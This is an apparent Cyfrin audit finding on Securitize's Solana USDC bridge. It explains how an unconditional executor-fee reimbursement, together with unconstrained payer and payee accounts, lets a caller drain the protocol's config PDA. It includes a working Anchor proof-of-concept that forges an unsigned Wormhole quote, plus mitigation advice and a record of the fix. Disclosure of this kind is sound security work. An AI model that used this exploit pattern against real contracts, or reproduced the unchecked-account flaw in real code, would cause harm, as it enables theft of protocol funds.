---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-06-26-cyfrin-securitize-svm-bridge-acl-support-v2-0-0-0
ingested_at: '2026-07-19T07:07:17Z'
protocol_category: []
published_at: '2026-06-26T00:00:00Z'
related_swc: []
severity: Low
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-26-cyfrin-securitize-svm-bridge-acl-support-v2.0.md
tags:
- firm:cyfrin
- report:2026-06-26-cyfrin-securitize-svm-bridge-acl-support-v2-0
title: '`send_usdc_cross_chain_deposit` unconditionally reimburses the executor fee
  from the protocol `config` PDA with an unconstrained `payer` and `executor_payee`'
vuln_class: []
---

# `send_usdc_cross_chain_deposit` unconditionally reimburses the executor fee from the protocol `config` PDA with an unconstrained `payer` and `executor_payee`

_Section severity (from Solodit section header): Low_  
_Audit firm: Cyfrin_  
_Source report: [2026-06-26-cyfrin-securitize-svm-bridge-acl-support-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-26-cyfrin-securitize-svm-bridge-acl-support-v2.0.md)_

---

**Description:** On the USDC bridge path, the executor relay fee is sourced from the protocol's own `config` PDA rather than from the user, and the reimbursement is unconditional. `securitize_usdc_bridge::send_usdc_cross_chain_deposit` runs three steps in sequence (`send_usdc_cross_chain_deposit.rs:200-210`): `validate_payer_lamports_for_executor`, then `invoke_request_execution_cpi`, then `reimburse_executor_fee`. The CPI issues a `request_for_execution` call whose only fund movement is a system transfer of `exec_amount` lamports from `payer` to `executor_payee` (`send_usdc_cross_chain_deposit.rs:356-374`). Immediately after, `reimburse_executor_fee` does `config.sub_lamports(exec_amount); payer.add_lamports(exec_amount)` (`send_usdc_cross_chain_deposit.rs:337-338`), crediting `exec_amount` lamports from the protocol `config` PDA back to `payer`.

Two missing constraints turn this reimbursement into a drain. First, `executor_payee` is a bare `UncheckedAccount` (`send_usdc_cross_chain_deposit.rs:155-157`) with no validation that it is the legitimate Wormhole executor payee, and there is no check that `executor_payee != payer`. Second, `payer` is an unconstrained `Signer` (`send_usdc_cross_chain_deposit.rs:18-21`); the `bridge_caller` gate covers only `caller` (the USDC owner), not `payer`. A caller can therefore set `payer == executor_payee` so the executor CPI is a net-zero self-transfer, while the unconditional reimbursement still pays `payer` `exec_amount` out of the `config` PDA. The reimbursement never verifies that a relay was actually purchased, that `exec_amount` matches the off-chain signed quote, or that the lamports left `payer`'s control. By contrast, the other two executor-fee call sites (`securitize_bridge::bridge_ds_tokens, bridge_spl_tokens`) have the user's `payer` pay `exec_amount` directly with no reimbursement from protocol funds, so they do not leak protocol value.

The Wormhole Executor being a trusted, out-of-scope component does not block this. The Executor (program `execXUrAsMnqMmTHj5m7N1YQgsDz3cwGLYCYyuDRciV`, Wormhole [`example-messaging-executor`](https://github.com/wormholelabs-xyz/example-messaging-executor)) is designed to stay lightweight and performs no on-chain signature verification of the signed quote, leaving quote verification to the submitting client; its [`request_for_execution`](https://github.com/wormholelabs-xyz/example-messaging-executor/blob/e0b191c878e81af65a8c95cd02c69fb6f6f73f6a/svm/anchor/programs/executor/src/lib.rs#L14-L86) only checks that the passed `payee` account equals bytes `[24..56]` of the quote, that the quote's source/destination chain ids match, and that its expiry is in the future, then does a plain `system_program` transfer of `amount` from `payer` to `payee`. The Executor's [README](https://github.com/wormholelabs-xyz/example-messaging-executor/blob/e0b191c878e81af65a8c95cd02c69fb6f6f73f6a/README.md#executor-contract) states this explicitly: "this contract MUST NOT verify the signature on the Quote ... The Quote SHOULD be verified by the submitting client code." Here the bridge is that client, and `send_usdc_cross_chain_deposit` forwards the caller-supplied `signed_quote_bytes` to the Executor unmodified and never verifies them. An attacker therefore forges a well-formed (unsigned) quote naming themselves as `payee` with matching chain ids and a far-future expiry, sets `payer == executor_payee == attacker`, and the real Executor accepts it and performs a net-zero self-transfer; the bridge then reimburses the attacker from `config`. The accompanying PoC constructs exactly this forged quote.

**Files:**

- `securitize_usdc_bridge::send_usdc_cross_chain_deposit` - `bc-solana-bridge-sc/programs/securitize_usdc_bridge/src/instructions/bridge/send_usdc_cross_chain_deposit.rs:18-21,155-157,200-210,329-375`

**Impact:** Direct theft of the protocol-owned `config` PDA's SOL. Each call nets the caller up to `config.max_executor_fee` lamports from the `config` PDA, since `exec_amount` is bounded only by `require_gte!(config.max_executor_fee, exec_amount)` (`send_usdc_cross_chain_deposit.rs:194-198`). The call is repeatable until `validate_executor_fee_balance` (`send_usdc_cross_chain_deposit.rs:299-303`) can no longer satisfy `config.lamports >= rent_min + exec_amount`, i.e. until the entire SOL surplus the protocol holds to sponsor relays is drained down to the rent-exempt minimum. No price movement, admin error, or third-party donation is required, and because the CCTP burn still executes, each draining call looks like an ordinary bridge transfer. Even a benign whitelisted caller acting in self-interest receives a free `exec_amount` subsidy that never funds a relayer, so the relay the protocol paid for is never performed while the protocol still bears the cost. The Wormhole Executor's trusted, out-of-scope status does not mitigate this: by design it never verifies the quote signature, so an attacker-forged quote naming themselves as `payee` is accepted and no real relay is purchased. A prior Securitize Solana bridge audit already treated depletion of this same `config` PDA SOL reserve through executor fees as a valid issue.

**Proof of Concept:** The following Anchor test was added to the existing `#sendUsdcCrossChainDeposit` test suite (which loads the mock CCTP and mock executor programs via the test-validator genesis) and passes (`1 passing`). A single allowlisted caller sets `payer == executor_payee`; after one `send_usdc_cross_chain_deposit` the protocol `config` PDA is debited by exactly `exec_amount` while the attacker's balance rises, and no relay is ever delivered:

```typescript
// Add this test to `tests/specs/securitize-usdc-bridge.spec.ts` inside the
// `describe("#sendUsdcCrossChainDeposit", ...)` block (it reuses that block's
// fixtures: an initialized USDC bridge config, a registered bridge_caller for
// `ownerKp`, and `realCallerTokenAccount` owned by `ownerKp`).
//
// Run with: anchor test --skip-build
// (Node 24; the mock CCTP token-messenger/message-transmitter and mock executor
// programs are loaded from tests/programs/ via Anchor.toml [[test.genesis]].)
//
// The signed quote is FORGED. The real Wormhole Executor (program
// execXUrAsMnqMmTHj5m7N1YQgsDz3cwGLYCYyuDRciV) performs NO on-chain signature
// verification of the quote and request_for_execution only checks
// payee == signed_quote_bytes[24..56], the src/dst chains at [56..60], and the
// expiry at [60..68] - all attacker-controlled. So a forged, well-formed quote
// naming the attacker as payee passes the real executor exactly as it passes the
// mock here. The bridge forwards this caller-supplied quote to the executor
// unmodified and never verifies it.
//
// Result: 1 passing. The config PDA is debited by exactly exec_amount and the
// attacker's balance increases, with no relay ever delivered.
it("PoC: allowlisted caller drains the config PDA SOL reserve via the unconditional executor-fee reimbursement", async () => {
  const conn = provider.connection;

  // The protocol funds the config PDA with a relay-sponsorship SOL float (a
  // precondition for ANY sponsored relay; validate_executor_fee_balance requires
  // config.lamports >= rent_min + exec_amount). Not attacker-controlled.
  const configPda = usdcBridgeConfigPda(realUsdcMint);
  await airdropSol(conn, configPda, 5);

  // Attacker-controlled signer A is used as BOTH `payer` and `executor_payee`.
  // `caller` stays the legitimately-allowlisted wallet (bridge_caller PDA registered
  // in `before`), and its USDC account funds the burn - the deposit looks ordinary.
  const attacker = Keypair.generate();
  await airdropSol(conn, attacker.publicKey, 3); // > exec_amount, for the pre-CPI payer-balance check

  // exec_amount is bounded only by config.max_executor_fee (10 SOL in tests).
  const execAmount = 1 * LAMPORTS_PER_SOL;

  const depositAmount = 500 * ONE_USDC;
  await mintUsdcTo(
    conn,
    ownerKp,
    realUsdcMint,
    realCallerTokenAccount,
    realMintAuthority,
    depositAmount
  );

  const recipient = randomEvmRecipient();

  // Forge a well-formed (unsigned) Executor quote: payee = attacker at [24..56],
  // src_chain = Solana (1) at [56..58], dst_chain = ETHEREUM_CHAIN_ID at [58..60],
  // expiry = u64::MAX at [60..68]. The real executor accepts this (no sig check);
  // the mock ignores it. Layout per execXUrAsMnqMmTHj5m7N1YQgsDz3cwGLYCYyuDRciV.
  const forgedQuote = Buffer.alloc(68);
  attacker.publicKey.toBuffer().copy(forgedQuote, 24);
  forgedQuote.writeUInt16BE(1, 56);
  forgedQuote.writeUInt16BE(ETHEREUM_CHAIN_ID, 58);
  forgedQuote.writeBigUInt64BE(BigInt("18446744073709551615"), 60);

  const configBefore = await conn.getBalance(configPda);
  const attackerBefore = await conn.getBalance(attacker.publicKey);

  const result = await SecuritizeUsdcBridgeClient.instructions.sendUsdc(ctx.bridge, {
    targetChain: ETHEREUM_CHAIN_ID,
    recipient,
    amount: depositAmount,
    execAmount,
    signedQuoteBytes: forgedQuote,
    usdcMint: realUsdcMint,
    callerUsdcAccount: realCallerTokenAccount, // owned by the allowlisted caller
    cctpDomain: ETHEREUM_CCTP_DOMAIN,
    executorAccounts: {
      executorProgram: EXECUTOR_PROGRAM_ID,
      payee: attacker.publicKey, // executor_payee == payer => executor CPI nets zero
    },
    ownerKp: attacker, // signs as `payer` (decoupled from caller)
    callerKp: ownerKp, // signs as `caller` (the allowlisted bridge_caller)
  });

  const tx = new Transaction().add(...result.instructions);
  // Make the allowlisted caller the tx fee payer so the attacker's balance delta
  // reflects only the on-chain reimbursement logic, not transaction fees.
  tx.feePayer = ownerKp.publicKey;
  await provider.sendAndConfirm!(tx, [attacker, ...result.signers]);

  const configAfter = await conn.getBalance(configPda);
  const attackerAfter = await conn.getBalance(attacker.publicKey);

  // The protocol-owned config PDA is drained by exactly exec_amount...
  expect(configBefore - configAfter).to.equal(execAmount);
  // ...and the attacker pockets it (net positive even after paying the CCTP
  // message-account rent), with no relay ever delivered.
  expect(attackerAfter).to.be.greaterThan(attackerBefore);
});
```

**Textual Step-by-Step Proof:**

1. The owner registers a `bridge_caller` PDA for caller `K` (normal operational setup). The `config` PDA holds SOL above its rent-exempt minimum, as it must for any sponsored relay, since `validate_executor_fee_balance` requires `config.lamports >= rent_min + exec_amount`.
2. The attacker controls a whitelisted caller `K` and an arbitrary signer `A`. They build a `send_usdc_cross_chain_deposit` transaction with `caller = K`, `payer = A`, `executor_payee = A` (the same account as `payer`), `exec_amount = config.max_executor_fee`, and a legitimate `amount` of USDC from `K`'s token account satisfying `amount > config.max_fee`.
3. The handler passes all checks: the `bridge_caller` PDA validates `K`, `caller_usdc_account` is owned by `K`, `validate_executor_fee_balance` passes because the `config` PDA is funded, and `validate_payer_lamports_for_executor` passes because `A` holds at least `exec_amount`.
4. `invoke_deposit_for_burn` executes the CCTP `deposit_for_burn`, so the USDC bridges normally.
5. `invoke_request_execution_cpi` issues the executor CPI, whose system transfer is `A -> A` of `exec_amount` lamports - a net-zero self-transfer that leaves `A`'s balance unchanged.
6. `reimburse_executor_fee` then runs unconditionally: `config.sub_lamports(exec_amount); A.add_lamports(exec_amount)`. `A` gains `exec_amount` lamports drawn from the protocol `config` PDA.
7. Net result per call: the `config` PDA loses `exec_amount` (up to `max_executor_fee`) and `A` pockets it, while the transaction otherwise looks like a normal bridge transfer. The attacker repeats the call until `config.lamports` falls to the rent-exempt minimum, draining the protocol's entire relay-sponsorship SOL float.

**Recommended Mitigation:** Stop reimbursing the executor fee from protocol funds based on a caller-supplied `exec_amount`. Either:

- (a) Have the user's `payer` pay the executor with no reimbursement, matching the `bridge_ds_tokens, bridge_spl_tokens` paths; remove `reimburse_executor_fee` entirely; or
- (b) If the protocol must sponsor relays, do not make the data-bearing `config` PDA the Executor CPI's `payer`: the Executor moves funds with a `system_program` transfer, which can only debit a system-owned account, whereas `config` is a program-owned data account (`Box<Account<UsdcBridgeConfig>>`) whose lamports can only be moved by direct `sub_lamports`/`add_lamports`. Instead either (i) keep the user's `payer` fronting the fee and reimbursing it from `config` by direct lamport debit, or (ii) front the fee from a dedicated system-owned funding PDA that signs the Executor CPI via seeds. In both cases the payee constraint alone is not sufficient, because the Wormhole Executor does not verify the signed quote on-chain: gate the `config`/funding-PDA spend on an in-program verification of the signed quote - check the quoter signature against an approved quoter key (or use a canonical on-chain quote source) and bind the funded `exec_amount`, `executor_payee`, source/destination chains, and expiry to that verified quote - and require `executor_payee != payer` so funds are only ever spent on an authentic, relayed request.

In either case, do not move `config` PDA funds - whether by reimbursing `payer` or by paying the executor directly - without a verified binding between the spent amount and a real, authenticated outbound relay payment.

**Securitize:** Fixed in commit [6893436d](https://github.com/securitize-io/bc-solana-bridge-sc/commit/68943d6a43f4a9fa0c6f8a0ce8b0c308cbd9790c). The protocol no longer sponsors the executor fee: reimburse_executor_fee (and the config.sub_lamports / payer.add_lamports reimbursement) was removed entirely, so config PDA funds are never moved on this path. The executor fee is now paid directly by the user's payer via the executor CPI's payer and payee system transfer, with no reimbursement — matching the bridge_ds_tokens and bridge_spl_tokens paths. This eliminates the drain: a net-zero self-transfer no longer yields any payout from protocol funds.

**Cyfrin:** Verified.
